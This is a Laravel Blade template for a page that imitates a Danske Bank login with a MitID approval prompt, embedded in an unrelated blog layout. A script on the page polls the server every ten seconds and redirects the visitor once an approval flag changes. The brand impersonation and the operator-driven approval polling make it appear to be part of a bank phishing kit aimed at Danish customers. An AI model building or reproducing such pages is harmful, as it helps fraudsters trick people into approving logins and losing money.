@extends('frontend.layout')
{{-- Page title --}}
@section('title')
    Home
@stop
{{-- page level styles --}}
@section('header_styles')
@stop

@section('content')
    @include('frontend.header')
    <!-- Start Blog
============================================= -->
    <div class="blog-area single full-blog right-sidebar full-blog p-5 ">
        <div class="container">
            <div class="blog-items">
                <div class="row">
                    <div class="blog-content col-lg-7 col-md-12">
                        <div class="blog-item-box">
                            <div class="item">
                                <div class="info">
                                    <div class="text-center">
                                        <img src="{{asset('images/danske-bank-logo.svg')}}">
                                    </div>
                                    <div class="blog-item-box p-3 pt-5">
                                        <div class="item">
                                            <div class="info pb-2">
                                                <div class="pb-3" style="align-items: center">
                                                    <span>Log på hos Danske Bank A/S</span>
                                                    <div class="right" style="float: right" >
                                                        <img width="52" src="{{asset('images/logo-blue-1.png')}}">
                                                    </div>
                                                </div>
                                                <hr class="sidebar-divider my-0">
                                            </div>
                                            <div class="info pt-2 text-center">
                                                <a class="blue-color" href="{{route('user.approve')}}" target="_blank">Abn MitID app og godkend</a>
                                                <div class="pt-3">
                                                    <div class="mobile-shap">
                                                        <div class="innerflex">
                                                            <div class="div"></div>
                                                            <div class="div"></div>
                                                            <div class="div"></div>
                                                        </div>
                                                        <div class="innerflex">
                                                            <div class="div"></div>
                                                            <div class="div"></div>
                                                            <div class="div"></div>
                                                        </div>
                                                        <div class="innerflex">
                                                            <div class="div"></div>
                                                            <div style="display: flex; align-items: center;">
                                                                <img src="/images/mbl-logo-1.png" alt=""></div>
                                                            <div class="div"></div>
                                                        </div>
                                                        <div class="innerflex">
                                                            <div class="div"></div>
                                                            <div class="div"></div>
                                                            <div class="div"></div>
                                                        </div>
                                                        <div class="innerflex" style="margin-bottom: 0px; justify-content: start; padding-left: 8px;">
                                                            <div class="div"></div><div class="div"></div>
                                                        </div>
                                                    </div>
                                                </div>

                                            </div>
                                        </div>
                                    </div>

                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- Start Sidebar -->
                    <div class="sidebar col-lg-5 col-md-12">
                        @include('frontend.sidebar')
                    </div>
                    <!-- End Start Sidebar -->
                </div>
            </div>
        </div>
    </div>
    <!-- End Blog -->
@endsection
{{-- page level scripts --}}
@section('footer_scripts')
    <script>
        let enable = '{{$enable}}';
        if(enable == '1') check();
        function check() {
            $.ajax({url:'{{route('check.approve')}}', success: function(result){
                    if(result.success && result.approve != 1){
                        location.href = '{{route('user.approve')}}';
                    }
                    else{
                        setTimeout(function () {
                            check();
                        }, 10000);
                    }
                }});
        }
    </script>
@endsection